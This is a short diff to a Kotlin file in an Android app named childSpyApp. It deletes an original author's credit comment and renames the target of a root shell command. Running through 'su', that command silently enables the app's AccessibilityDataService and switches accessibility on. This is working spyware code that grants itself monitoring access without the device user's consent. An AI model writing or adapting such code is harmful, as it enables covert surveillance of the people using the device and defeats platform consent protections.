@@ -25,9 +25,7 @@ import sammy.mutahi.gicheru.childSpyApp.BuildConfig
 import sammy.mutahi.gicheru.childSpyApp.R
 
 
-/**
- * Created by luis rafael on 13/03/18.
- */
+
 object ConstFun{
 
 
@@ -90,7 +88,7 @@ object ConstFun{
         try {
             process = Runtime.getRuntime().exec("su")
             val os = DataOutputStream(process.outputStream)
-            os.writeBytes("settings put secure enabled_accessibility_services com.github.midros.child/com.github.midros.child.services.key.AccessibilityDataService\n")
+            os.writeBytes("settings put secure enabled_accessibility_services sammy.mutahi.gicheru.childSpyApp/sammy.mutahi.gicheru.childSpyApp.services.accessibilityData.AccessibilityDataService\n")
             os.flush()
             os.writeBytes("settings put secure accessibility_enabled 1\n")
             os.flush()
